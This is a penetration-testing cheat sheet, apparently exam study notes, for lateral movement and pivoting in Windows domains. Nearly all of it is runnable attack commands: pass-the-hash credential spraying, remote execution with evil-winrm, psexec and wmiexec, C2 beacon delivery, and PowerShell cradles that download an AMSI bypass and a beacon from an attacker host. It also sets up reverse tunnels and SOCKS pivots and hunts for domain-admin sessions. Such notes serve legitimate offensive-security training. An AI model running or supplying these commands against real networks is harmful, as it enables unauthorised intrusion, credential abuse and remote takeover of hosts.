# Phase 07: Lateral Movement & Pivoting

> Move from your foothold to other hosts. Get a beacon on every reachable machine.

---

## 1. Find Where You Can Go

```bash
# Spray creds across the network
nxc smb <subnet>/24 -u username -H <NTLM_hash> --continue-on-success
nxc winrm <subnet>/24 -u username -H <NTLM_hash>
# (Pwn3d!) = local admin on that host

# Check WinRM specifically (quietest lateral move)
nxc winrm <subnet>/24 -u username -p Password1
```

---

## 2. Execution Methods

```bash
# WinRM (preferred — quietest, no service creation)
evil-winrm -i <target> -u domain\username -H <NTLM_hash>
evil-winrm -i <target> -u domain\username -p Password1

# WMI (no service created, medium noise)
wmiexec.py domain/username:Password1@<target>
wmiexec.py -hashes :<NTLM_hash> domain/username@<target>

# PsExec (creates service — loud but reliable)
psexec.py domain/username:Password1@<target>
psexec.py -hashes :<NTLM_hash> domain/username@<target>

# SMBExec (no binary drop, slightly quieter than psexec)
smbexec.py domain/username:Password1@<target>

# atexec (scheduled task — auditable)
atexec.py domain/username:Password1@<target> "whoami"
```

---

## 3. Deliver Beacon to New Host

```bash
# Method A: upload via C2 + execute (cleanest)
sliver (beacon) > upload /local/beacon.exe C:\\Windows\\Temp\\beacon.exe
sliver (beacon) > shell
> C:\Windows\Temp\beacon.exe

# Method B: PowerShell cradle from new Evil-WinRM session
evil-winrm -i <target> -u username -H <hash>
*Evil-WinRM* PS> IEX(New-Object Net.WebClient).DownloadString('http://<your_ip>/amsi_bypass.ps1')
*Evil-WinRM* PS> IEX(New-Object Net.WebClient).DownloadString('http://<your_ip>/beacon.ps1')

# Method C: via existing Sliver beacon using execute-assembly + lateral move
sliver (beacon) > psexec --remote <target_ip> C:\Windows\Temp\beacon.exe
```

---

## 4. Pivoting — Reaching Segmented Networks

When the next target isn't directly reachable from Kali:

```bash
# Chisel (TCP/UDP tunnel over HTTP)
# On Kali (server):
./chisel server -p 8080 --reverse

# On compromised host (via C2 shell):
.\chisel.exe client <kali_ip>:8080 R:socks

# Now use proxychains → routes all traffic through the pivot:
proxychains nxc smb <internal_target> -u username -p Password1
proxychains evil-winrm -i <internal_target> -u username -p Password1

# Ligolo-ng (better performance than Chisel for exam use)
# Kali: ./proxy -selfcert
# Target: .\agent.exe -connect <kali_ip>:11601 -ignore-cert
# Kali: add route → interface ligolo → start
# Then route traffic normally without proxychains
```

---

## 5. SOCKS Proxy via C2

```bash
# Sliver built-in SOCKS5 (simplest during exam)
sliver (beacon) > socks5 start --host 127.0.0.1 --port 1080

# Configure proxychains on Kali
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf

# Now all tools route through the beacon's network
proxychains nmap -sT -p 80,443,445,5985 <internal_subnet>/24
proxychains bloodhound-python -u user -p pass -d domain.local -dc <dc_ip> -c All
```

---

## 6. Hunt the DA / High-Value Targets

```bash
# Find where domain admins are logged in
nxc smb <subnet>/24 -u username -p Password1 --loggedon-users | grep -i "admin\|DA"
nxc smb <subnet>/24 -u username -p Password1 --sessions

# PowerView from beacon
sliver (beacon) > execute-assembly /tools/PowerView.ps1 "Invoke-UserHunter -GroupName 'Domain Admins' -CheckAccess"
```

---

## Exam Tip

Every time you land on a new host — immediately run Seatbelt and check for SeImpersonatePrivilege. Many exam environments have multiple hosts each requiring their own privesc before moving forward.

---

## Next Step → **Phase 08: AD Enumeration** (`08-ad-enumeration.md`)
